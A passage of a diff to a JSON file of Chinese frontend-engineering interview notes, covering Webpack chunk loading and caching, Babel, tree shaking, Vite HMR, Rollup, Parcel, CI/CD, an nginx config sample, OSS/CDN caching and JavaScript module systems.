+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-6",
+          "title": "webpack 如何处理require？",
+          "content": "在 Webpack 的世界里，不论你在源码里写的是 `const a = require('./a')` 还是 `import a from './a'`，打包后它们的效果确实是**一样**的。\n\n- **编译阶段**：Webpack 会扫描所有的静态依赖，把它们全部塞进同一个（或指定的几个）Bundle 块中。\n    \n- **运行阶段**：Webpack 会在 Bundle 内部维护一个 `modules` 对象（即**模块定义映射表**）。\n    \n- **执行逻辑**：当你调用 Webpack 模拟的 `__webpack_require__` 时，它会去映射表里找。如果模块已经执行过，直接从缓存拿 `exports`；如果没有，就执行模块代码并存入缓存。\n    \n\n**结论：** 静态 `import` 和 `require` 都会被视为**同步依赖**。它们会被打包在一起，在页面启动时就全部加载完成，不会产生额外的网络请求",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-7",
+          "title": "Webpack 异步加载的底层原理（JSONP）",
+          "content": "当你在代码里写下 `import('./A')`，Webpack 在运行时其实做了以下几件事：\n\n1. **发起请求**：通过 `document.createElement('script')` 动态创建一个标签，指向子包的 URL。\n2. **JSONP 回调**：子包的文件内容通常包裹在一个函数里，例如 `self[\"webpackChunk\"].push([[chunkId], { modules... }])`。\n3. **合并模块**：当脚本加载成功，这个全局回调被触发。Webpack 的 Runtime 接收到新模块，把它们合并到主 Bundle 的模块映射表中。\n4. **Resolve Promise**：原来 `import()` 返回的那个 Promise 被标记为成功，你就可以在 `.then()` 或 `await` 之后拿到模块内容了。",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-8",
+          "title": "webpack 如何拆分 Chunk 动态加载？",
+          "content": "动态 `import()` 是触发“代码分割（Code Splitting）”的最主要开关\n- **静态加载**：`import A from './A'` $\\rightarrow$ A 模块被打包进 Main Bundle $\\rightarrow$ **网络一次性下载**。\n    \n- **动态加载**：`import('./A')` $\\rightarrow$ Webpack 自动将 A 模块及其依赖单独切出来，生成一个 `src_A_js.bundle.js` $\\rightarrow$ **运行到这一行时才发请求下载**。\n\n除了动态import ，还提供了**配置驱动**的拆分方案：\n\n- **`optimization.splitChunks` (抽离公共库)**： 这是最常用的。你可以配置“如果某个模块（如 `lodash` 或 `react`）被引用了超过 2 次，或者来自 `node_modules`，就把它单独拆成一个 `vendors.js`”。这样即使你没写动态 `import`，它也会被拆出来。\n    \n- **多入口配置 (`entry`)**： 如果你配置了多个入口（比如 `index.js` 和 `admin.js`），Webpack 会自动为每个入口生成独立的 Bundle。",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-9",
           "title": "Webpack 的持久化缓存，如何判断文件是否需要重新编译",
           "content": "将上一次构建的结果（包括解析的模块、生成的 AST、转译后的代码等）存储到磁盘上，这样在后续构建中，如果文件或其依赖没有变化，就可以**跳过整个 Loader 链和模块构建过程**，直接复用缓存结果。这使得二次构建（特别是使用 HMR 时的开发构建）的速度大大加快。\n\n持久化缓存通过在 `webpack.config.js` 中设置 `cache` 属性来启用：\n\n```js\nmodule.exports = {\n  // ... 其他配置\n  cache: {\n    type: 'filesystem', // 启用基于文件系统的持久化缓存\n    buildDependencies: {\n      // 告诉 Webpack 哪些文件变动会导致缓存失效\n      config: [__filename], \n    },\n    // 默认缓存目录是 node_modules/.cache/webpack\n    // name: 'my-app-cache', // 可自定义缓存名称\n  },\n  // ...\n};\n```\n\n如何判断和检查是否可以用缓存：\n\n- **检查全局配置：** Webpack 检查自身的版本、Node.js 版本以及配置文件的哈希是否匹配。如果不匹配，清空所有缓存。\n\n- **检查模块哈希：** Webpack 检查当前文件的内容哈希。如果不匹配，缓存失效。\n\n- **检查 Loader/Plugin 配置：** Webpack 检查作用于该文件的 Loader 链和 Plugin 选项是否与缓存中记录的一致。如果不一致，缓存失效。\n\n- **检查依赖哈希：** Webpack 检查该模块所依赖的其他模块的哈希是否匹配。只要一个依赖项发生变化，当前模块的缓存就失效。",
           "hasAnswer": true
         },
         {
+          "id": "engineering-10",
+          "title": "说说webpack 联邦模块",
+          "content": "它允许**多个独立的 Webpack 构建应用**在运行时共享代码和依赖，给**前端微服务架构**提供基础。\n\n它让一个应用（Host）可以在运行时动态加载另一个独立应用（Remote）的代码模块，就像加载本地模块一样。\n\nRemote (远程方)：独立打包的应用。暴露 (Expose) 自己的部分代码模块供其他应用使用。Host (主机方)：独立打包的应用。消费 (Consume) 远程应用暴露出的模块。\n\n两个应用都需要的公共依赖，如 React、Vue。确保所有应用共享同一份依赖实例，避免重复加载和版本冲突\n\nModule Federation 通过在 Webpack 构建输出中添加特殊的 **“容器 (Container)”** 机制来实现：",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-11",
+          "title": "Code Splitting 的多种方案",
+          "content": "1.入口点分割 (Entry Points)\n\n这是最基础的分割方式。开发者手动在配置文件中定义多个入口文件，Webpack 会为每一个入口点生成一个独立的 Bundle。\n\n- **实现方式：** 在 `webpack.config.js` 的 `entry` 配置中定义多个键值对。\n\n- **适用场景：** 传统多页应用 (MPA)，每个页面对应一个入口；或者当你有两个完全独立的 SPA，想用一个 Webpack 配置打包时。\n\n- 示例 entry: {\n   pageA: './src/page-a.js',\n   pageB: './src/page-b.js',\n   },\n\n- **缺点：** 无法动态加载，且公共依赖代码（如 React 库）会被重复打包到每个入口的 Bundle 中\n\n当构建工具遇到 `import('./moduleA')` 时，它会将 `moduleA` 及其所有依赖单独打包成一个或多个 **Chunk（代码块）**，并在运行时异步加载。\n\nTree Shaking 确保了即使是懒加载的代码块，也只包含真正用到的逻辑，实现了体积的最小化。\n\n2.动态导入 (Dynamic Imports / 运行时加载)\n\n这是最常用、最灵活的代码分割方案，基于 ES Module 的 `import()` 语法，在运行时根据需要加载代码。\n\n- **实现方式：** 在代码中使用 `import('./path/to/module')`。\n\n- **适用场景：**\n  \n  - **路由懒加载：** 将每个路由页面打包成独立的 Chunk。\n  \n  - **组件懒加载：** 将不常用或在视口外的组件进行懒加载。\n  \n  - **条件加载：** 例如，用户点击某个按钮或满足某个条件时才加载特定的库。\n\n- **优点：** 实现了真正的**按需加载 (On-demand)**，大幅减少初始加载体积。\n\n- **缺点：** 必须处理加载状态（如使用 Suspense 或 Loading 占位符）。\n\n3.提取公共模块 (Vendor/Commons)\n\n目的是将多个模块（入口或动态导入）共享的依赖（如 React, Lodash, jQuery 等第三方库）提取出来，形成一个独立的公共 Chunk，以利用客户端的**缓存机制**。\n\n- **实现方式：** 使用 Webpack 的 `optimization.splitChunks` 配置。\n\n- **适用场景：** 任何包含大量第三方依赖或有多个入口点的应用。\n\n- **配置策略 (`optimization.splitChunks`)：**\n  \n  - **`vendors` (第三方库)：** 将所有来自 `node_modules` 的模块打包在一起。\n  \n  - **`default` (公共模块)：** 将应用内被多个模块（通常是两个以上）引用的代码提取出来。\n\n- **优点：** 充分利用浏览器缓存，核心库代码（如 React）稳定后，用户无需重复下载。\n\n- 示例 \n\n```js\nmodule.exports = {\n  // ...\n  optimization: {\n    splitChunks: {\n      chunks: 'all', // 对所有类型的 Chunk 生效\n      cacheGroups: {\n        // 自动提取 node_modules 中的库\n        vendor: {\n          test: /[\\\\/]node_modules[\\\\/]/,\n          name: 'vendors',\n          priority: -10,\n        },\n        // 提取被多次使用的公共模块\n        default: {\n          minChunks: 2, \n          priority: -20,\n          reuseExistingChunk: true,\n        },\n      },\n    },\n  },\n};\n```",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-12",
+          "title": "Babel编译原理和插件开发",
+          "content": "Babel 的编译过程严格遵循计算机科学中的编译器原理，可以划分为三个核心阶段：**解析 (Parse)**、**转换 (Transform)** 和 **生成 (Generate)**。\n\n阶段一：解析：此阶段的目标是将原始源代码转换为抽象语法树 (AST)。\n\n1. **词法分析 (Lexical Analysis/Tokenizing):**\n   \n   - 将输入的代码字符串分解成一个个独立的、最小的语法单元，称为 **Token**（标记）。\n   \n   - 例如：`const a = 1;` 会被分解为 `const`, `a`, `=`, `1`, `;` 等 Token。\n\n2. **语法分析 (Syntactic Analysis/Parsing):**\n   \n   - 将 Token 流组合成一个树状的结构，即 **AST (Abstract Syntax Tree)**。\n   \n   - AST 中的每个节点都代表了代码中的一个结构，如变量声明 (`VariableDeclaration`)、标识符 (`Identifier`)、函数调用 (`CallExpression`) 等。\n   \n   - Babel 默认使用 **`@babel/parser`** (以前叫 Babylon) 来进行解析。\n\n获得的AST是个很大超大的JSON，好在Webpack 或 Babel 是**逐个文件**读取和处理的。并且AST不存储时，是临时的数据\n\n阶段二：转换 (Transformation)\n\n这是 Babel 工作的核心，**插件**主要在这个阶段发挥作用。\n\n1. **遍历 (Traversing):**\n   \n   - Babel 会深度优先遍历整个 AST。\n\n2. **插件执行:**\n   \n   - 当遍历器遇到特定的节点类型时，它会调用注册了该节点类型的 **Babel 插件**。\n   \n   - 插件通过操作 AST 节点（增、删、改、替换），将高版本语法转换为目标环境支持的语法。\n   \n   - 例如，将 ES6 的箭头函数 (`ArrowFunctionExpression`) 节点转换成 ES5 的普通函数表达式 (`FunctionExpression`) 节点。\n\n3. **Babel 默认使用 **`@babel/traverse`** 来进行 AST 遍历和节点操作。\n\n阶段三：生成 (Generating)\n\n此阶段的目标是将转换后的 AST 重新渲染为目标代码字符串。\n\n1. **递归生成:** Babel 递归地遍历修改后的 AST，将每个节点打印成对应的代码字符串。\n\n2. **Source Map:** 同时，还会生成 **Source Map**，用于将转译后的代码映射回原始源代码，以便于调试。\n\n3. **Babel 默认使用 **`@babel/generator`** 来进行代码生成。",
+          "hasAnswer": true
+        },
+        {
           "id": "engineering-13",
-          "title": "联邦模块",
-          "content": "它允许**多个独立的 Webpack 构建应用**在运行时共享代码和依赖，从而实现了真正的**前端微服务架构**。\n\n它让一个应用（Host）可以在运行时动态加载另一个独立应用（Remote）的代码模块，就像加载本地模块一样。\n\nRemote (远程方)：独立打包的应用。暴露 (Expose) 自己的部分代码模块供其他应用使用。Host (主机方)：独立打包的应用。消费 (Consume) 远程应用暴露出的模块。\n\n两个应用都需要的公共依赖，如 React、Vue。确保所有应用共享同一份依赖实例，避免重复加载和版本冲突\n\nModule Federation 通过在 Webpack 构建输出中添加特殊的 **“容器 (Container)”** 机制来实现：",
+          "title": "Tree shaking原理和条件",
+          "content": "Tree Shaking 的原理可以概括为两步：**标记（Marking）和清除（Sweeping）**。\n\n1. 标记：基于 ES Module 的静态分析\n\n- **静态结构：** ESM 的 `import` 和 `export` 语句在代码执行前就已经确定了模块之间的依赖关系和导出的名称。这意味着，构建工具可以在**编译阶段（编译时）**，而不是运行阶段，确定哪些代码被使用了，哪些没有。\n\n- **依赖图构建：** 构建工具会从入口文件开始，构建一个完整的模块依赖图（Module Dependency Graph）。\n\n- **使用标记：** 在遍历依赖图的过程中，构建工具会标记出**实际被导入和使用的**模块、函数或变量。没有被任何地方导入或引用的代码则会被标记为“未使用”。\n\n2. 清除：移除未标记的代码\n- 在标记阶段完成后，优化器（通常是 UglifyJS 或 Terser）会执行清除操作。\n\n- 它会遍历所有模块，**物理性地移除**那些被标记为“未使用”（即 Dead Code）的代码块。\n\nwebpack  Tree Shaking 的生效条件\n\n 1. 必须使用 ES Module 语法\n\n- **导出：** 必须使用 `export` 或 `export default`。\n\n- **导入：** 必须使用 `import` 语句。\n\n- ESM 的 `import()` 动态导入不会阻止 Tree Shaking，反而会成为 Tree Shaking 的起点，实现更精细的按需加载。\n\n- 在这个动态导入的场景中，Tree Shaking 确保了即使是懒加载的代码块，也只包含真正用到的逻辑，实现了体积的最小化。\n\n2. 保证代码是“无副作用的” (Side-Effect Free)：Tree Shaking 的机制是安全的移除**没有副作用**的代码。\n\n- **定义：** “副作用”是指执行该模块时，除了导出值之外，还会修改全局状态或执行其他操作（例如：修改 DOM、调用 API、修改原型链）。\n\n- **标记：** 如果一个模块被标记为有副作用，即使它的导出没有被使用，构建工具也可能出于安全考虑保留整个模块。\n\n- **实践：`package.json` 的 `\"sideEffects\": false`** 为了告诉构建工具一个库（或文件）是完全无副作用的，可以在项目的 `package.json` 中添加\n\n3. 配置生产模式优化，通过设置 `mode: 'production'` 启用，因为它默认包含了像 Terser 这样的代码压缩工具，而压缩工具是执行最终清除（Sweeping）步骤的关键。\n\n4. 转换工具的配置。如果使用了 Babel 等工具进行代码转换，必须配置它**不将 ES Module 转换成 CommonJS 模块**。\n\n- 例如，在 Babel 配置中，需要确保 `@babel/preset-env` 中**没有**设置 `modules: 'commonjs'`，或者明确设置为 `modules: false`",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-14",
+          "title": "介绍一下vite",
+          "content": "",
+          "hasAnswer": false
+        },
+        {
+          "id": "engineering-15",
+          "title": "webpack vite区别",
+          "content": "1. 构建原理\n\t- Webpack：构建期打包，bundle-first\n\t- Vite：开发阶段基于原生 ESM，production 基于Rollup打包\n2. 热更新：文件发生变化时：\n\t- Webpack 重新 **构建依赖图** ， 生成新的 chunk， 通过 HMR Runtime 把更新后的模块推送到浏览器，浏览器端执行 `module.hot.accept`，替换模块。webpack 必须重新分析模块依赖关系，重新生成 chunk。所以项目越大，**依赖图越复杂，重建成本越高**，即使只改一个文件，也可能触发大范围构建。\n\t- Vite 开发环境下，每个文件就是一个原生 ESM 模块， Vite 只重新处理这个文件， 找到该模块的 HMR 边界，通过 WebSocket 通知浏览器， 浏览器直接替换这个模块。更新粒度是**单文件 / 单模块**，不需要重新构建整个依赖图，所以HMR 成本与项目规模几乎无关\n3. 生产打包：\n\t- webpack:  插件 + loader 可高度定制，适合复杂工程（微前端、多入口、老模块）。输出结果容易偏“工程化”，不够干净\n\t\t构建完整依赖图\n\t\tloader 转换源码\n\t\tplugin 参与优化\n\t\t拆 chunk（SplitChunks）\n\t\t压缩、混淆\n\t\t输出最终 bundle\n\t - vite: 生产环境用Rollup，Tree Shaking 更彻底，Bundle 体积更小，输出代码结构更清晰\n\t    基于 AST 静态分析 ESM\n\t    精准 Tree Shaking\n\t    更干净的 chunk 划分  \n\t\tVite 插件会转成 Rollup 插件执行\n4. 配置与心智负担\n\t- Webpack 配置项多，学习成本高\n\t- Vite 配置偏约定式，上手成本低\n5. 生态\n\t- Webpack 插件和 loader 生态成熟\n\t- Vite 插件生态增长快，但在复杂工程上仍不如 Webpack\n总结来说：\n\tWebpack 胜在**可控性和复杂场景**  \n\tVite 胜在**开发体验和现代工程**",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-16",
+          "title": "Vite HMR 边界是怎么找的？",
+          "content": "Vite 的 HMR 边界是沿着 ESM 的 import 依赖链向上查找，直到遇到显式接受更新的模块为止。\n 一、什么叫 HMR 边界？\n **HMR 边界 = 能安全“吞掉”更新、不需要整页刷新的模块** 。也就是：不需要把影响继续往父模块传播 的边界\n 二、Vite 为什么能精确找 HMR 边界？\n 核心前提：ESM 是静态的\n - import 关系是**编译期确定的**\n- Vite 能维护一张模块依赖图（Module Graph）\n注意：Vite 不是每次 HMR 重新构建依赖图，而是增量维护。\n三、Vite 查找 HMR 边界的完整过程\n假设改了 `Foo.vue`\nStep 1：定位变更模块，Vite 先重新 transform 这个模块。\nStep 2：向上查找 importer\nStep 3：判断是否能 accept 更新：对每一层父模块，Vite 会检查是否是HMR的边界\nStep 4：如果一路向上，找不到边界 ，直到到达入口（如 `main.ts`）, Vite 会触发全量刷新\n\n1️⃣ 那 CSS 为什么几乎总是热更新成功？\nCSS 天然是副作用模块，不影响 JS 执行状态，Vite 会直接替换 style 内容，本身就是 HMR 边界。\n2️⃣ 为什么有时改一个文件会整页刷新？\n 因为这次修改影响的模块链路上没有任何模块接受更新，Vite 找不到 HMR 边界，只能 fallback 到 full reload。\n3️⃣ HMR 边界是插件决定的吗？\n **部分是**。   框架插件（如 Vue / React）会自动注入 HMR accept 逻辑，从而人为制造 HMR 边界。Vue / React 插件会在 transform 阶段自动为组件注入 accept 逻辑\n4️⃣ 什么叫显式接受 HMR，具体如何判断？\n显式接受 HMR 指的是开发者针对模块通过 `import.meta.hot.accept` 明确声明自己可以安全处理热更新。  \n5️⃣ 插件是如何添加accept的？\n插件只敢给 **“幂等、可替换、无全局副作用”** 的模块加 HMR 边界。\n插件不是“判断模块安全”，而是“识别已知安全模式的模块”，只对这些模式注入 HMR accept。在 transform 阶段，通过 AST 分析识别符合框架约定的模块，比如 Vue 组件或 React 组件，这些模块的生命周期和重建行为是框架可控的。\n插件判断一个模块能否成为 HMR 边界，依据的是：\n1. **文件类型**（`.vue  .jsx`）因为 组件可销毁，可重新挂载，状态由框架管理，生命周期可控\n2. **导出结构**（导出一个组件对象）\n3. **框架约定**（组件生命周期可控）\n4. **白名单策略**（只对已知安全模式生效）\n6️⃣ 为什么 store / router 往往会触发全量刷新？\n因为 store / router 通常是“全局单例 + 强副作用模块”，插件不敢也不能自动给它们加 HMR 边界。",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-17",
+          "title": "为什么 Webpack 很难做到像 Vite 那样精细的 HMR？",
+          "content": "因为 Webpack 的 HMR 是建立在 bundle / chunk 体系之上的，而不是建立在原生 ESM 模块体系之上。模块替换、依赖传播和边界判断都需要运行时协调，粒度难以做到很细。\nWebpack 模块最终会被**打包进 chunk**，运行时加载的是 bundle，HMR 更新的是 **chunk 中的模块**。Webpack的模块并不是浏览器原生模块，而是运行在 Webpack runtime 中的函数。\n而 Vite 基于原生 ESM，每个文件就是独立模块，HMR 只需要替换单个模块并沿 import 链传播，因此更精细也更稳定。",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-18",
+          "title": "讲讲Rollup 的原理 特点 适用场景",
+          "content": "Rollup 是一款专注于 **ESM (ES Modules)** 的深度打包工具。\n**原理**\n- 基于 **ESM 的静态结构**\n- 在构建阶段通过 AST 分析模块依赖\n- 标记未使用的导出，实现 Tree Shaking\n- 最终生成更干净、可读性更高的 bundle\n**特点：** \n- **构建产物纯净：** 几乎没有冗余代码，体积最小化。\n- **插件机制：** 采用双钩子机制，非常灵活。\n- **天然支持 ESM：** 输出格式支持 ESM、CommonJS 和 UMD。\n**适用场景：** Rollup 是**类库（Library）和组件库**打包的首选（如 React/Vue 源码都用它）。但它对 HMR（热更新）和图片等静态资源处理较弱，通常不建议用于大型业务应用开发。",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-19",
+          "title": "讲讲Parcel",
+          "content": "提供一个**极速、开箱即用**的现代前端开发体验，让开发者可以专注于代码本身，而不是复杂的构建配置, 设计初衷是简化工程化复杂度。对于大多数常见的项目类型（如 JavaScript、CSS、HTML、图片等），它不需要任何配置文件 (`parcel.config.js` 或 `webpack.config.js`) 就能直接工作。\n\n 核心特点\n- 几乎不需要配置：零配置**支持基于 ES 模块的**动态导入 (`import()`)，并自动将应用分割成更小的块，实现按需加载。\n- 资源支持：Parcel 天生支持各种文件类型，内置对 TS、JS、CSS、图片等的处理\n- 支持开箱即用的 HMR：Parcel 默认启用快速的热模块替换，可以保留应用状态并即时更新模块，提高开发效率。\n- 极速打包：**Parcel 利用 **多核处理 (Worker 进程)** 来并行编译资源，并使用文件系统缓存。这使得它的初始构建和二次构建速度都非常快。\n\n**总结：** Parcel 上手成本极低，是一个适合快速启动、中小型项目，以及追求简单配置和极致开发速度的开发者的优秀选择。",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-20",
+          "title": "前端自动化测试策略",
+          "content": "前端自动化测试常见的三个维度：\n\n1. **单元测试 (Unit Testing)：** 成本最低、速度最快。主要针对工具函数、纯逻辑 Hooks 或公共组件。常用工具：**Jest, Vitest**。\n2. **集成测试 (Integration Testing)：** 关注多个组件或模块协同工作的逻辑，模拟用户交互行为（如点击按钮后列表是否刷新）。常用工具：**React Testing Library, Vue Test Utils**。\n3. **端到端测试 (E2E Testing)：** 成本最高，但信心最强。模拟真实用户在浏览器环境的操作流程（如登录流程、下单流程）。常用工具：**Playwright, Cypress**。\n\n 业务项目中，优先覆盖核心逻辑的**集成测试**，对底层库强制要求**单测覆盖率**，对主业务路径配置关键的 **E2E 冒烟测试**。",
           "hasAnswer": true
         }
       ]
@@ -1321,13 +1363,13 @@
         {
           "id": "cicd-1",
           "title": "CI/CD流程",
-          "content": "持续集成 (CI)：快速、自动化地验证代码质量。包括代码质量检查lint，git hook触发流程 , build构建\n\n持续交付 (CD)：确保代码随时可以自动化地部署到生产环境。包括发布，流量切换，回滚等",
+          "content": "持续集成 (CI)：快速、自动化地验证代码质量。包括\n代码质量检查lint：代码 提交前的lint校验，保证代码质量、风格一致\ngit hook触发流程：开发者提交代码到远程仓库；git Webhook 监听到代码变动触发流水线。\nbuild构建：执行 `npm install` 和 `npm run build`，产出 `dist` 文件。\n\n持续交付 (CD)：确保代码随时可以自动化地部署到生产环境。包括\n发布：将 `dist` 内容推送到服务器或 OSS\n流量切换：多服务器时部署后的合理切换策略，比如蓝绿等\n回滚：必要时能快速回滚到指定版本\n\n**核心意义**：减少人为操作失误（比如忘了跑 build 就上线），确保上线过程可追溯、可回滚。",
           "hasAnswer": true
         },
         {
           "id": "cicd-2",
           "title": "nginx配置",
-          "content": "Nginx 主要用于作为**反向代理**、**静态资源服务器**和**负载均衡器**。\n\n前端常用：配置SPA 、静态资源路径、反向代理解决跨域、缓存配置、Gzip 压缩等",
+          "content": "Nginx 主要用于作为**反向代理**、**静态资源服务器**和**负载均衡器**。\n\n前端常用：配置SPA 、静态资源路径、反向代理解决跨域、缓存配置、Gzip 压缩等\n\n核心配置项：\n\n```\nserver {\n    listen 80;\n    server_name example.com;\n\n    # 1. 静态资源托管\n    location / {\n        root /usr/share/nginx/html;\n        index index.html;\n        try_files $uri $uri/ /index.html; # 关键：解决 Vue/React Router 刷新 404 问题\n    }\n\n    # 2. 反向代理（解决跨域）\n    location /api/ {\n        proxy_pass http://api.backend.com/; # 转发到真实后端\n    }\n\n    # 3. 开启 Gzip 压缩\n    gzip on;\n    gzip_types text/plain application/javascript text/css;\n}\n```",
           "hasAnswer": true
         },
         {
@@ -1338,48 +1380,54 @@
         },
         {
           "id": "cicd-4",
-          "title": "oss",
-          "content": "- **作用:** 高可靠、高并发、低成本的静态文件存储服务（如 AWS S3, 阿里云 OSS）。\n\n- **前端应用:** 通常将前端构建产物直接上传到 OSS 存储桶中，然后通过 CDN 绑定该存储桶的域名进行加速访问。\n\n- **优势:** 免维护服务器、高可用性。",
+          "title": "oss 是什么？有什么作用和优势",
+          "content": "- 高可靠、高并发、低成本的静态文件存储服务（如 AWS S3, 阿里云 OSS）。\n\n- **前端应用:** 通常将前端构建产物直接上传到 OSS 存储桶中，然后通过 CDN 绑定该存储桶的域名进行加速访问。\n\n- **优势:** 免维护服务器、高可用性。\n\n和cdn对比：\nOSS (Object Storage Service - 对象存储)\n- **作用**：像一个海量的硬盘，专门存静态文件（图片、JS、CSS、视频）。\n- **优势**：高可靠（文件不丢）、按量付费（省钱）、不占用服务器磁盘。\n\nCDN (Content Delivery Network - 内容分发网络)\n- **作用**：像连锁店。在全国各地放服务器，缓存 OSS 里的内容。\n- **优势**：**就近访问**。你在北京访问，CDN 就从北京节点给你发货，速度极快。\n\n| **维度** | **OSS**            | **CDN**                 |\n| ------ | ------------------ | ----------------------- |\n| **本质** | **仓库**（存东西的地方）     | **快递**（送东西的地方）          |\n| **位置** | 固定的中心机房            | 分布在全国各地的边缘节点            |\n| **配合** | 前端产物 `dist` 传给 OSS | 域名指向 CDN，CDN 回源 OSS 拿数据 |",
           "hasAnswer": true
         },
         {
           "id": "cicd-5",
+          "title": "OSS 怎么配合 CDN 做缓存刷新的主流方案",
+          "content": "文件哈希 + 强缓存：这是目前不需要手动频繁刷新 CDN 的最稳妥方案：\n\n- **静态资源 (JS/CSS/Image)**：文件名带上 Hash（如 `main.a1b2c3.js`）。设置 CDN 为**强缓存**（Cache-Control: max-age=31536000）。\n    - _原理_：文件名变了，CDN 没见过这个文件，会自动回源 OSS 拿新的。\n\n- **入口文件 (index.html)**：文件名不变。设置 CDN 为**协商缓存**（Cache-Control: no-cache）。\n    - _原理_：每次访问 index.html，CDN 都会回源头对比一下。如果 index.html 更新了，它就下发新的，从而引导浏览器去加载新的 Hash 资源。",
+          "hasAnswer": true
+        },
+        {
+          "id": "cicd-6",
           "title": "npm pnpm",
           "content": "pnpm：下载包全局存储，然后硬链接到项目目录。所以避免一台机器上重复下载和拷贝，节约磁盘空间，且安装快速\n\n严格的非扁平化依赖树，**避免幽灵依赖**。只允许访问声明的依赖，提高稳定性。",
           "hasAnswer": true
         },
         {
-          "id": "cicd-6",
+          "id": "cicd-7",
           "title": "npm install后发生了什么",
           "content": "- **检查本地缓存:** 检查 `node_modules` 是否存在，以及 `lock` 文件是否与 `package.json` 匹配。\n\n- **下载依赖:**\n  \n  - **npm/Yarn:** 访问 npm Registry，根据 `lock` 文件中记录的 URL/Hash/Version 下载依赖包，并存入全局缓存。\n  \n  - **pnpm:** 检查本地内容寻址存储中是否已存在该版本的包。如果存在，跳过下载。\n\n- **构建依赖树:**\n  \n  - **npm/Yarn:** 根据下载的包创建**扁平化**的依赖树结构，解决依赖冲突（如果能解决）。\n  \n  - **pnpm:** 根据 `lock` 文件创建**严格的非扁平化**依赖树，使用**硬链接和符号链接**连接到全局存储的包。\n\n- **执行生命周期脚本:** 运行依赖包中定义的 `install`、`postinstall` 等脚本（例如 `node-sass` 或 `Puppeteer` 的编译步骤）。\n\n- **生成/更新 Lock 文件:** 如果 `package.json` 有变化，更新 `package-lock.json` 或 `pnpm-lock.yaml`，确保团队构建环境的一致性。",
           "hasAnswer": true
         },
         {
-          "id": "cicd-7",
-          "title": "模块化发展历程(AMD/CMD/UMD/ES6)",
-          "content": "**CommonJS (CJS)** 同步加载，`require()` 和 `module.exports`。用在node环境\n\n**AMD 异步**加载，适合浏览器，如 RequireJS。**依赖前置**，模块定义时所有依赖就绪并加载（预先加载）。\n\n**CMD**异步加载，推崇就近依赖。模块代码执行到 `require` 时才加载（按需加载）。\n\n**UMD**通用模式，兼容 CJS、AMD 和全局变量，用于库的发布。是**打包规范**，用于让一个模块或库同时兼容多种加载环境。\n\n**ES Module (ESM)** 静态加载、`import` / `export`，支持 Tree Shaking 和 `import()` 动态加载。\n\nAMD CMD UMD 它们都需要引入各自的模块加载器库，因为浏览器不原生支持这些规范。\n\nWebpack（以及其他现代构建工具，如 Rollup, Parcel, Vite）在编译时处理了 CJS 的引用和依赖关系，并消除了对原生 CJS 运行时环境的需求\n\n**Webpack 打包后的 Bundle 中，用于加载同步依赖的 `require()` 是同步执行的。打包后require和静态import相当于效果一样？想要拆分chunk并异步加载需要动态import？**\n\n- Webpack 识别源代码中的 `require('')` 语句，并将其视为一个**静态依赖**。\n\n- 会在最终 Bundle 中保留原生的 `require` 函数。\n\n- 它会将每个 CJS 模块包装在一个函数中，并注入一个小的 **Webpack Runtime** 代码（一个自定义的模块加载器，例如一个 `__webpack_require__` 函数）。\n\n- 这个运行时函数负责在 Bundle 内部查找、执行和缓存模块，从而实现了**同步的模块加载效果**，而无需进行网络请求。",
-          "hasAnswer": true
-        },
-        {
           "id": "cicd-8",
-          "title": "动态 import()",
-          "content": "返回一个 Promise 对象。可以用.then或者async await\n\nJavaScript 模块化机制中最核心、最稳定的特性：**模块单例（Module Singleton）**。对于所有现代 JavaScript 模块规范（CJS, AMD, **ESM**），无论是同步导入还是动态导入，一旦一个模块被加载并执行，它的结果就会被**缓存**起来。",
+          "title": "模块化发展历程(AMD/CMD/UMD/ES6)",
+          "content": "**CommonJS (CJS)** 同步加载，`require()` 和 `module.exports`。用在node环境\n\n**AMD 异步**加载，适合浏览器，如 RequireJS。**依赖前置**，模块定义时所有依赖就绪并加载（预先加载）。\n\n**CMD**异步加载，推崇就近依赖。模块代码执行到 `require` 时才加载（按需加载）。\n\n**UMD**通用模式，兼容 CJS、AMD 和全局变量，用于库的发布。是**打包规范**，用于让一个模块或库同时兼容多种加载环境。\n\n**ES Module (ESM)** 静态加载、`import` / `export`，支持 Tree Shaking 和 `import()` 动态加载。\n\nAMD CMD UMD 它们都需要引入各自的模块加载器库，因为浏览器不原生支持这些规范。\n\nWebpack（以及其他现代构建工具，如 Rollup, Parcel, Vite）在编译时处理了 CJS 的引用和依赖关系，并消除了对原生 CJS 运行时环境的需求\n\n补充：JavaScript 模块化机制中最核心、最稳定的特性：**模块单例（Module Singleton）**。对于所有现代 JavaScript 模块规范（CJS, AMD, **ESM**），无论是同步导入还是动态导入，一旦一个模块被加载并执行，它的结果就会被**缓存**起来。",
           "hasAnswer": true
         },
         {
           "id": "cicd-9",
+          "title": "动态 import()",
+          "content": "这是前端性能优化重要方式，也就是所谓的**路由懒加载**。\n用法：返回一个 Promise 对象。可以用.then或者async await\n\n- **作用：** 只有当代码真正运行到这一行时，才去服务器下载对应的 JS 模块。\n\n- **原理（Webpack 实现）：**\n    1. **代码分割 (Code Splitting)**：构建工具识别到 `import()`，会将该模块打包成一个独立的子包（Chunk）。\n    2. **JSONP 加载**：运行到该行时，浏览器动态插入一个 `<script>` 标签指向子包地址。\n    3. **异步执行**：脚本加载完成后，Promise 状态变为 `resolved`，执行后续逻辑。\n\n- **优势：**\n    1. **减小首屏体积**：不用一次性下载几 MB 的代码。 \n    2. **按需加载**：用户不点击的功能永远不下载，省流量。",
+          "hasAnswer": true
+        },
+        {
+          "id": "cicd-10",
           "title": "前端微服务架构实践",
           "content": "**核心目标:** 将一个庞大的前端应用拆分为多个独立开发、独立部署、独立运行的小应用。\n\n- **Module Federation (推荐):** Webpack 5 联邦模块功能，实现运行时模块共享和依赖去重。\n\n- **Single-SPA/Qiankun (基于框架):** 通过路由劫持和沙箱机制，实现应用级的集成。\n\n- **Web Components/Iframe (隔离):** 通过浏览器原生技术实现 UI 隔离。",
           "hasAnswer": true
         },
         {
-          "id": "cicd-10",
+          "id": "cicd-11",
           "title": "Monorepo 项目管理",
